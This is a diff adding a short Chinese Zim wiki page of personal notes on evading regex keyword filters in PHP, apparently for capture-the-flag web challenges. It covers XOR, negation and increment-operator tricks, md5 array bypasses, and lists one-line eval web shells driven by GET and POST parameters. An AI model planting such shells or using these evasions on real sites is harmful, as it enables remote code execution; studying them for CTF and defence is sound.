@@ -1,0 +1,60 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.6
+Creation-Date: 2024-11-24T17:01:04+08:00
+
+====== bypass正则屏蔽词 ======
+Created 星期日 24 十一月 2024
+
+
+[[编码表-ascii]]
+
+传入数组？
+
+拆分字符串：'class' == 'cla'.'ss'
+
+chr(int):string  输入0~255整数，返回字符
+ord(string): int  输入字符，返回0~255整数
+
+文件大小限制绕过：
+<?=eval($_GET[1]);
+<?=eval($_POST[1]);
+	''<?=''  // 相当于 <?php echo ， 当然在后面执行eval也是没有问题的
+	不需要闭合''?>''也可以执行
+
+
+
+https://blog.csdn.net/qq_45521281/article/details/105656936
+插入%9
+
+异或绕过：
+?num='%ab'^'%ff';
+字符串之间的异或会被当作ascii码做异或运算
+
+取反绕过
+
+URL编码取反绕过
+
+递增运算符绕过：https://www.php.net/manual/en/language.operators.increment.php
+利用 PERL string increment feature 对字符串变量做自增操作
+$var = 'a';
+var_dump(++$var)  // 输出b。注意只能对变量进行自增
+注意字符串只能包括字母和数字
+++'a' => 'b'
+++'z' => 'aa'
+++'Z' => 'AA'
+
+同时，将数组转为字符串，或数组与字符串拼接，数组将被转换成'Array'字符串，可以利用其中的字母A或a，再运算得到整个字母表。
+'''
+$_=[];
+$_="$_";  // 得到'Array'
+$_=$_['!'=='@'];  // $_=$_[0] => 'A'
+'''
+
+
+https://cloud.tencent.com/developer/article/2287094
+md5绕过
+[[md5]]
+
+md5数组绕过
+
+绕过空格：
